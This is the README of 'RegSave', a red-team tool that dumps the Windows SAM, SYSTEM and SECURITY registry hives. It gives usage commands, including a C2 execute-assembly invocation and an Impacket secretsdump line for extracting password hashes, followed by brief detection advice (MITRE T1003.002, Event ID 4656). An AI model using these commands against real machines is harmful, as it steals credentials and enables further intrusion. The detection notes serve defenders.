# RegSave

A .NET 3.5 application that will dump SAM / SYSTEM / SECURITY registry keys to a path of your choosing.

## Usage

```
regsave.exe c:\Users\USER\Appdata\Local
execute-assembly /opt/CS/toolkit/regsave.exe c:\Users\USER\Appdata\Local
```
Collect the files and then parse them with [Impacket secretsdump](https://github.com/SecureAuthCorp/impacket)

```
secretsdump.py -sam samantha.txt -security secundum.txt -system systemless.txt LOCAL
```


## Detection
[MITRE 1003.002](https://attack.mitre.org/techniques/T1003/002/)

Look for Event ID 4656 after configuring audit policy. 

More info at 
[Detecting Attempts to steal passwords from the registry](https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-the-registry-7512674487f8)